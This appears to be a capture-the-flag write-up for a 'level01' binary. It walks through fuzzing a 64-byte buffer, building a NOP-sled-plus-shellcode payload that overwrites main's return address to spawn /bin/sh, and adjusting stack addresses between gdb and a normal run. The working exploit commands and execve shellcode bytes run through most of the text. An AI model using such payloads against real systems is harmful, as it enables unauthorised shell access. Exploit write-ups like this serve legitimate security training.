=> Fuzzing, filling the buffers
=> The first fgest doesn't overflow and return every time "invalid username"
=> Let's try the second fgets after write "dat_wil" for the username
=> If we fill the buffer more than 64 bytes it SEGFAULT, 
=> We can writes 100 bytes on a 64 bytes buffer 
python -c 'print "dat_wil" + "\n" + "A"*+200'

=> We can overwrite values on the stack and the ret addr of main 
=> Then we create a payload that overwrite the ret addr of main and redirect it to a shellcode inside the buffer
python -c 'print "dat_wil\n" + "\x90"*(80-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xec\xd5\xff\xff"'

=> It doesn't work, we have a SEGFAULT 
0xffffd61d in ?? ()

=> And it's because a value in our buffer is written in the middle of our payload
by the instruction ret = 1 after the error msg "invalid pass";

=> Then we need to avoid this address by write our payload before or after 
=> Let's test to write the payload before:
python -c 'print "dat_wil\n" + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*(80 - 48) + "\xe8\xd5\xff\xff"'
=> /bin/dash new process is executed 

=> When we try outside gdb we have a SIGILL and that's because the env var is different like 
_=/usr/bin/gdb 
_=/usr/bin/env

=> To get the address that we want we fuzz and play with the address of the ret addr of main 
0xffffd5e8 -> 0xffffd6ec (add 4 bytes)

(python -c 'print "dat_wil\n" + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*(80 - 48) + "\xec\xd5\xff\xff"'; cat) | ./level01

